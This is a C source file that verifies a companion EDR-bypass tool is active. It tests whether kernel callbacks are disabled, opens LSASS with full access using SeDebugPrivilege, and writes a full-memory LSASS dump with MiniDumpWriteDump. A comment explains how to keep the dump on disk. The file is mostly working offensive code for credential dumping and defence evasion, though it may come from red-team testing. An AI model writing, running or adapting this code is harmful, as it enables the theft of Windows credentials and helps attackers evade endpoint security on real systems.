/*
 * test_bypass.c — Verify each EDR bypass is active
 *
 * Tests (in order):
 *   [1] Ps* Notify  — process creation not blocked/logged by EDR
 *   [2] OB          — OpenProcess(LSASS, ALL_ACCESS) succeeds
 *   [3] ETW-TI      — NtReadVirtualMemory into LSASS succeeds
 *   [4] Minifilter  — write suspicious PE file, EDR doesn't delete it
 *   [5] CM callback — write to sensitive registry key without block
 *   [6] LSASS dump  — MiniDumpWriteDump (gold standard, proves everything)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -o test_bypass.exe test_bypass.c \
 *       -lkernel32 -ladvapi32 -ldbghelp
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* colour helpers */
static HANDLE g_con;
static void col(WORD a){SetConsoleTextAttribute(g_con,a);}
#define GREEN  (FOREGROUND_GREEN|FOREGROUND_INTENSITY)
#define RED    (FOREGROUND_RED|FOREGROUND_INTENSITY)
#define YELLOW (FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_INTENSITY)
#define WHITE  (FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE|FOREGROUND_INTENSITY)
#define PASS(f,...) do{col(GREEN); printf("  [PASS] " f "\n",##__VA_ARGS__); col(WHITE);}while(0)
#define FAIL(f,...) do{col(RED);   printf("  [FAIL] " f "\n",##__VA_ARGS__); col(WHITE);}while(0)
#define WARN(f,...) do{col(YELLOW);printf("  [WARN] " f "\n",##__VA_ARGS__); col(WHITE);}while(0)
#define INFO(f,...) do{            printf("         " f "\n",##__VA_ARGS__);}while(0)

static DWORD find_pid(const char *name)
{
    HANDLE h=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(h==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe={sizeof pe}; DWORD pid=0;
    for(BOOL ok=Process32First(h,&pe);ok;ok=Process32Next(h,&pe))
        if(!_stricmp(pe.szExeFile,name)){pid=pe.th32ProcessID;break;}
    CloseHandle(h); return pid;
}

static void enable_debug_priv(void)
{
    HANDLE tok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&tok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok,FALSE,&tp,0,NULL,NULL); CloseHandle(tok);
}

/* [1] Ps* Notify */
static void test_ps(void)
{
    printf("\n[1] Ps* Notify — spawn a process, check EDR doesn't terminate it\n");
    STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi={0};
    if(CreateProcessA("C:\\Windows\\System32\\whoami.exe",NULL,
                      NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        WaitForSingleObject(pi.hProcess,2000);
        DWORD ec=STILL_ACTIVE; GetExitCodeProcess(pi.hProcess,&ec);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if(ec!=STILL_ACTIVE)
            PASS("Process ran and exited normally — EDR did not terminate it");
        else
            WARN("Process still running after 2 s — check manually");
    } else {
        FAIL("CreateProcess failed (err=%lu)",GetLastError());
    }
}

/* [2] OB callbacks */
static HANDLE test_ob(DWORD lsass_pid)
{
    printf("\n[2] OB callbacks — OpenProcess(LSASS, PROCESS_ALL_ACCESS)\n");
    INFO("LSASS PID = %lu",lsass_pid);
    HANDLE h=OpenProcess(PROCESS_ALL_ACCESS,FALSE,lsass_pid);
    if(h){
        PASS("Handle obtained — OB callbacks DISABLED");
    } else {
        DWORD e=GetLastError();
        if(e==5) FAIL("Access Denied (5) — OB callbacks still active or PPL not bypassed");
        else     FAIL("OpenProcess failed (err=%lu)",e);
    }
    return h;
}

/* [3] ETW-TI: NtReadVirtualMemory */
static void test_etw(HANDLE hlsass)
{
    printf("\n[3] ETW-TI — ReadProcessMemory into LSASS\n");
    if(!hlsass){WARN("Skipped (no LSASS handle)");return;}
    uint8_t buf[64]={0}; SIZE_T br=0;
    /* 0x7FFE0000 = KUSER_SHARED_DATA, always readable, safe to read */
    if(ReadProcessMemory(hlsass,(LPCVOID)0x7FFE0000,buf,sizeof buf,&br)&&br>0)
        PASS("ReadProcessMemory succeeded (%zu bytes) — no crash/AV termination",(size_t)br);
    else
        FAIL("ReadProcessMemory failed (err=%lu)",GetLastError());
    INFO("Note: even if ETW-TI is active, reads succeed but generate Sysmon/Event 10.");
    INFO("True test: check Event Viewer → Microsoft-Windows-Threat-Intelligence for events.");
}

/* [4] Minifilter: write PE magic to disk, check EDR doesn't delete it */
static void test_flt(void)
{
    printf("\n[4] Minifilter — write .exe with PE header, check EDR doesn't delete\n");
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH]; snprintf(path,sizeof path,"%s\\edr_test_%lu.exe",tmp,GetCurrentProcessId());

    HANDLE hf=CreateFileA(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE){FAIL("CreateFile failed (err=%lu)",GetLastError());return;}
    /* Minimal PE header stub — WdFilter intercepts .exe writes via minifilter */
    const uint8_t mz[64]={'M','Z',0x90,0,3,0,0,0,4,0,0,0,0xFF,0xFF,0,0,
                           0xb8,0,0,0,0,0,0,0,0x40,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0x40,0,0,0};
    DWORD wr=0; WriteFile(hf,mz,sizeof mz,&wr,NULL); CloseHandle(hf);

    Sleep(800); /* give EDR time to react */

    /* Check file still has our content */
    hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){
        FAIL("File was deleted by EDR — minifilter still active!");
        return;
    }
    uint8_t rb[2]={0}; DWORD rr=0; ReadFile(hf,rb,2,&rr,NULL); CloseHandle(hf);
    DeleteFileA(path);
    if(rb[0]=='M'&&rb[1]=='Z')
        PASS("PE file written and survived — minifilter callbacks DISABLED");
    else
        FAIL("File content was modified — minifilter may be intercepting writes");
}

/* [5] CM callbacks */
static void test_cm(void)
{
    printf("\n[5] CM callbacks — write to HKCU\\SOFTWARE\\BypassTest\n");
    HKEY hk;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest",0,NULL,
                       REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hk,NULL)!=ERROR_SUCCESS)
    {FAIL("RegCreateKey failed (err=%lu)",GetLastError());return;}
    DWORD v=0xDEADBEEF;
    LSTATUS s=RegSetValueExA(hk,"TestValue",0,REG_DWORD,(BYTE*)&v,4);
    RegCloseKey(hk);
    RegDeleteKeyA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest");
    if(s==ERROR_SUCCESS)
        PASS("RegSetValueEx succeeded — CmRegisterCallback DISABLED");
    else
        FAIL("RegSetValueEx failed (err=%ld) — CM callbacks may still be active",s);
}

/* [6] LSASS full dump — gold standard */
static void test_dump(HANDLE hlsass, DWORD lsass_pid)
{
    printf("\n[6] LSASS dump — MiniDumpWriteDump (gold standard)\n");
    if(!hlsass){WARN("Skipped (no LSASS handle from test 2)");return;}

    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH];
    snprintf(path,sizeof path,"%s\\lsass_%lu.dmp",tmp,GetCurrentProcessId());

    /* FILE_FLAG_DELETE_ON_CLOSE: dump auto-deleted when handle is closed */
    HANDLE hf=CreateFileA(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE,NULL);
    if(hf==INVALID_HANDLE_VALUE){
        FAIL("Cannot create dump file (err=%lu)",GetLastError());
        return;
    }

    BOOL ok=MiniDumpWriteDump(hlsass,lsass_pid,hf,
                              MiniDumpWithFullMemory|MiniDumpWithHandleData,
                              NULL,NULL,NULL);
    DWORD e=GetLastError();
    LARGE_INTEGER fsz={0}; GetFileSizeEx(hf,&fsz);
    CloseHandle(hf); /* triggers DELETE_ON_CLOSE — dump removed from disk */

    if(ok){
        PASS("MiniDumpWriteDump SUCCESS (%lld MB) — ALL kernel bypasses confirmed!",
             (long long)(fsz.QuadPart>>20));
        INFO("Dump was held in memory only (auto-deleted by FILE_FLAG_DELETE_ON_CLOSE).");
        INFO("To save: remove FILE_FLAG_DELETE_ON_CLOSE and specify an output path.");
    } else {
        if(e==5)
            FAIL("Access Denied (5) — PPL not bypassed, OB still active, or dump filtered");
        else if(e==0x80070057)
            FAIL("Invalid param (0x57) — ETW-TI may be blocking NtReadVirtualMemory");
        else
            FAIL("MiniDumpWriteDump failed (err=0x%08lX = %lu)",e,e);
    }
}

int main(void)
{
    g_con=GetStdHandle(STD_OUTPUT_HANDLE); col(WHITE);
    SetConsoleOutputCP(CP_UTF8);

    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║       EDR Bypass Verification  — test_bypass     ║\n");
    printf("║  Run while all_edr_bypass.exe holds the bypass.  ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");

    enable_debug_priv();

    DWORD lsass_pid=find_pid("lsass.exe");
    if(!lsass_pid){printf("[-] lsass.exe not found\n");return 1;}

    test_ps();

    HANDLE hlsass=test_ob(lsass_pid);
    test_etw(hlsass);
    test_flt();
    test_cm();
    test_dump(hlsass,lsass_pid);

    if(hlsass) CloseHandle(hlsass);

    printf("\n══════════════════════════════════════════════════\n");
    printf("  Press Enter to exit.\n"); getchar();
    col(WHITE); return 0;
}
